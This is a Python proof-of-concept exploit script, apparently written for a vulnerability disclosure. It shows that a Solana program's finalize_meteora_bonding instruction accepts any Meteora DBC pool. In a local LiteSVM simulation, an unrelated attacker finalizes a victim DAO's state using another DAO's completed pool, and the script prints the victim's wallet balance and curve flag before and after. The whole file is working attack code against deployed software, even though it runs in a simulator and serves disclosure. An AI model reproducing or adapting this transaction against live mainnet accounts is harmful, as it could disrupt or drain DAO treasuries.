"""PoC: finalize_meteora_bonding accepts any DBC pool, not the state's own pool.
Attacker (no relation to either DAO) finalizes victim DAO Y using DAO X's completed pool.
Runs against evidence/mainnet.so with the real DBC program in LiteSVM."""
import sys, pathlib; sys.path.insert(0, str(__import__('pathlib').Path(__file__).resolve().parents[1]/'scripts'))
from probe_transfer_nft import *
DBC=Pubkey.from_string('dbcij3LWUppWqq96dh6gJWwBifmcGfLSB5D4DuSMaqN')
def run(binary):
 attacker=Keypair.from_seed(bytes([7])*32); creatorX=Keypair.from_seed(bytes([42])*32); adminY=Keypair.from_seed(bytes([43])*32)
 X=Pubkey.from_bytes(bytes([50])*32); Y=Pubkey.from_bytes(bytes([60])*32); funding=Pubkey.from_bytes(bytes([51])*32)
 ma,_=Pubkey.find_program_address([b'meteora_authority'],PROGRAM);pa,_=Pubkey.find_program_address([b'pool_authority'],DBC);ea,_=Pubkey.find_program_address([b'__event_authority'],DBC);config=Pubkey.from_string('BkoMF8PzYwoVQTKcQ6uNeQrHytw1jJN6ig4JzjcKS3iF')
 pool,_=Pubkey.find_program_address([b'pool',bytes(config),max(bytes(X),bytes(funding)),min(bytes(X),bytes(funding))],DBC)
 vm=LiteSVM().with_sigverify(False).with_transaction_history(0);vm.add_program(PROGRAM,binary.read_bytes());vm.add_program(T22,(ROOT/'evidence/token-2022.so').read_bytes());vm.add_program(DBC,(ROOT/'evidence/meteora-dbc.so').read_bytes());vm.airdrop(attacker.pubkey(),10**10)
 for m,tp in [(X,T22),(Y,T22),(funding,TOKEN)]:
  md=bytearray(82);md[36:44]=struct.pack('<Q',10**9);md[44]=9;md[45]=1;vm.set_account(m,Account(10**7,bytes(md),tp))
 def ta(owner,m,tp,amount,key=None):
  k=key or Pubkey.find_program_address([bytes(owner),bytes(tp),bytes(m)],ATA)[0];d=bytearray(165);d[:32]=bytes(m);d[32:64]=bytes(owner);d[64:72]=struct.pack('<Q',amount);d[108]=1;vm.set_account(k,Account(10**7,bytes(d),tp));return k
 basevault=ta(pa,X,T22,10000,Pubkey.find_program_address([b'token_vault',bytes(X),bytes(pool)],DBC)[0]);quotevault=ta(pa,funding,TOKEN,10000,Pubkey.find_program_address([b'token_vault',bytes(funding),bytes(pool)],DBC)[0])
 cd=bytearray(1048);cd[:8]=hashlib.sha256(b'account:PoolConfig').digest()[:8];cd[8:40]=bytes(funding);cd[40:72]=bytes(ma);cd[264:272]=struct.pack('<Q',10000);cd[247]=10;vm.set_account(config,Account(10**7,bytes(cd),DBC))
 pd=bytearray(424);pd[:8]=hashlib.sha256(b'account:VirtualPool').digest()[:8];pd[72:104]=bytes(config);pd[104:136]=bytes(ma);pd[136:168]=bytes(X);pd[168:200]=bytes(basevault);pd[200:232]=bytes(quotevault);pd[240:248]=struct.pack('<Q',10000);vm.set_account(pool,Account(10**7,bytes(pd),DBC))
 out={}
 for name,mint,admin in [('X',X,creatorX),('Y',Y,adminY)]:
  fee,_=Pubkey.find_program_address([b'fee_share_state',bytes(mint)],FEE)
  state,_=Pubkey.find_program_address([b'state',bytes(mint)],PROGRAM);wallet,_=Pubkey.find_program_address([b'wallet',bytes(mint)],PROGRAM);wf=ta(wallet,funding,TOKEN,100)
  sd=hashlib.sha256(b'account:State').digest()[:8]+bytes(admin.pubkey())+bytes(mint)+bytes(funding)+struct.pack('<QBBq',1234,0,0,9999999999)+bytes(3)+struct.pack('<H',1000)+bytes(fee)+bytes([0]);vm.set_account(state,Account(10**7,sd.ljust(256,b'\0'),PROGRAM))
  out[name]=(state,wallet,wf)
 def finalize(mint,who):
  state,wallet,wf=out[who]
  tokvault=Pubkey.find_program_address([b'token_vault',bytes(mint),bytes(pool)],DBC)[0]
  keys=[attacker.pubkey(),mint,funding,state,wallet,wf,config,pool,quotevault,tokvault,ma,pa,ea,T22,TOKEN,ATA,DBC]
  metas=[AccountMeta(k,i==0,i in [0,3,5,7,8,9]) for i,k in enumerate(keys)]
  ix=Instruction(PROGRAM,hashlib.sha256(b'global:finalize_meteora_bonding').digest()[:8],metas)
  r=json.loads(vm.send_transaction(Transaction.new_unsigned(Message.new_with_blockhash([ix],attacker.pubkey(),vm.latest_blockhash()))).to_json());vm.expire_blockhash();return r.get('err')
 bal=lambda k: struct.unpack('<Q',bytes(vm.get_account(k).data)[64:72])[0]
 flag=lambda s: (bytes(vm.get_account(s).data)[159], struct.unpack("<Q",bytes(vm.get_account(s).data)[104:112])[0])
 print('Y wallet before',bal(out['Y'][2]),'Y curve_initialized',flag(out['Y'][0]))
 print('attacker finalize(Y state, X pool) err =',finalize(Y,'Y'))
 print('Y wallet after',bal(out['Y'][2]),'Y curve_initialized',flag(out['Y'][0]))
 print('honest finalize(X state, X pool) err =',finalize(X,'X'),'X curve_initialized',flag(out['X'][0]),'X wallet',bal(out['X'][2]))
if __name__=='__main__':
 run(pathlib.Path(sys.argv[1]) if len(sys.argv)>1 else ROOT/'evidence/mainnet.so')
